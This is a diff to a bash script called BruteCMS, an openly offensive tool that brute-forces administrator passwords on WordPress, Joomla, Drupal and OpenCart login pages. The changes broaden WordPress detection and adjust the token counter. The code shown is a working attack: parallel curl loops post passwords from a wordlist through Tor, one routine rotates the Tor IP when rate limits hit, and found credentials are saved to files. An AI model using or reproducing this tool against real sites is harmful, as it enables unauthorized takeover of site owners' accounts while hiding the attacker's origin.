@@ -1,5 +1,5 @@
 #!/bin/bash
-# BruteCMS v1.0 
+# BruteCMS v1.0.1
 # Github: https://github.com/thelinuxchoice/brutecms
 # Coded by: thelinuxchoice (Don't change noob, read the LICENSE!)
 # Instagram: @thelinuxchoice
@@ -32,7 +32,7 @@ printf "\e[1;77m| ___ \          | |     \e[0m\e[1;92m/  __ \|  \/  |/  ___| \e[
 printf "\e[1;77m| |_/ /_ __ _   _| |_ ___\e[0m\e[1;92m| /  \/| .  . |\ \`--.  \e[0m\n"
 printf "\e[1;77m| ___ \ '__| | | | __/ _ \ \e[0m\e[1;92m|    | |\/| | \`--. \ \e[0m\n"
 printf "\e[1;77m| |_/ / |  | |_| | ||  __/ \e[0m\e[1;92m\__/\| |  | |/\__/ / \e[0m\n"
-printf "\e[1;77m\____/|_|   \__,_|\__\___|\e[0m\e[1;92m\____/\_|  |_/\____/  \e[0m\e[1;77mv1.0\e[0m\n"
+printf "\e[1;77m\____/|_|   \__,_|\__\___|\e[0m\e[1;92m\____/\_|  |_/\____/  \e[0m\e[1;77mv1.0.1\e[0m\n"
 printf "\n"
 printf "\e[101m::\e[1;77m CMS BruteForcer coded by: @thelinuxchoice ::\e[0m\n\n"
 printf "\e[1;77m[\e[0m\e[1;92m*\e[0m\e[1;77m] WordPress\e[0m\n"
@@ -111,7 +111,7 @@ checkcms() {
 printf "\e[1;77m [*] Detecting CMS...\e[0m\n"
 
 checkjoomla=$(curl --socks5-hostname 127.0.0.1:9050 -L -s "$site/administrator/index.php" | grep -o "joomla" | head -n 1)
-checkwp=$(curl --socks5-hostname 127.0.0.1:9050 -L -s "$site/wp-login.php" | grep -o "wordpress" | head -n 1)
+checkwp=$(curl --socks5-hostname 127.0.0.1:9050 -L -s "$site/wp-login.php" | grep -o 'wordpress\|wp-content' | head -n 1)
 checkdrupal=$(curl --socks5-hostname 127.0.0.1:9050 -L -s "$site/user/login" | grep -o "drupal" | head -n 1)
 checkopencart=$(curl --socks5-hostname 127.0.0.1:9050 -L -s "$site/admin/index.php" | grep -o "opencart" | head -n 1)
 
@@ -122,7 +122,7 @@ default_user="admin"
 read -p $'\e[1;77m[*] User (Default: \e[0m'$default_user'): ' user
 user="${user:-${default_user}}"
 joomla
-elif [[ $checkwp == "wordpress" ]]; then
+elif [[ $checkwp == "wordpress" ]] || [[ $checkwp == "wp-content" ]] ; then
 printf "\e[1;92m [*] WordPress detected!\e[0m\n"
 start
 wp
@@ -337,9 +337,9 @@ IFS=$'\n'
 countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
  
 printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $countpass $count_pass $pass
-
 let token++
 {(trap '' SIGINT && wp=$(curl --socks5-hostname 127.0.0.1:9050 -s -L -b cookiewp1.txt -d 'log='$user'&pwd='$pass'&testcookie=1&rememberme=forever' "$site/wp-login.php" | grep -o "dashboard" | head -n 1 ); if [[ $wp == "dashboard" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.brutecmsWP ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.brutecmsWP \n\e[0m";  kill -1 $$; fi; ) } & done; wait $!;
+let token--
 
 #changeip
 
@@ -364,6 +364,8 @@ printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $countpass $count_pass $pass #to
 let token++
 
 {(trap '' SIGINT && joomla=$(curl --socks5-hostname 127.0.0.1:9050 --user-agent '"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801"' -b cookiesjoomla -s "localhost/administrator/index.php" -d 'username=kali&passwd='$pass'&lang=en-GB&option=user_login&task=login&'$tokenjoomla=1'' -L -H 'keep_alive=1' | grep -o "logout" | head -n 1 ); if [[ $joomla == "logout" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.brutecmsjoomla ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.brutecmsjoomla \n\e[0m";  kill -1 $$; fi; ) } & done; wait $!;
+let token--
+
 #changeip
 
 done
@@ -388,6 +390,7 @@ printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $countpass $count_pass $pass
 
 let token++
 {(trap '' SIGINT && drupal=$(curl --socks5-hostname 127.0.0.1:9050 -s --header "Content-type: application/x-www-form-urlencoded" --request POST --data 'name=admin&pass='$pass'&form_id=user_login_form' "$site/user/login/" | grep -o 'Redirecting to\|Try again later' | head -n 1); if [[ $drupal == "Redirecting to" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.brutecmsdrupal ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.brutecmsdrupal \n\e[0m";  kill -1 $$; elif [[ $drupal == "Try again later" ]]; then printf "\e[1;93m \n [!] Too many attemps failed!\e[0m\n"; printf "\n\e[1;77m [*] Use threads=5 . Changing Tor IP\e[0m \n"; changeip; fi; ) } & done; wait $!;
+let token--
 
 changeip
 
@@ -407,11 +410,12 @@ for pass in $(sed -n ''$token','$((token+threads))'p' $wl_pass); do
 
 IFS=$'\n'
 countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
- 
+
 printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $countpass $count_pass $pass #token
 
 let token++
 {(trap '' SIGINT && opencart=$(curl --socks5-hostname 127.0.0.1:9050 --request POST -s --data 'username=admin&password='$pass'' "$site/admin/index.php" -i --user-agent 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.4) Gecko/20030624 Netscape/7.1 (ax)' | grep -o '302 Found'); if [[ $opencart == "302 Found" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.brutecmsopencart ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.brutecmsopencart \n\e[0m";  kill -1 $$; fi; ) } & done; wait $!;
+let token--
 
 #changeip
 
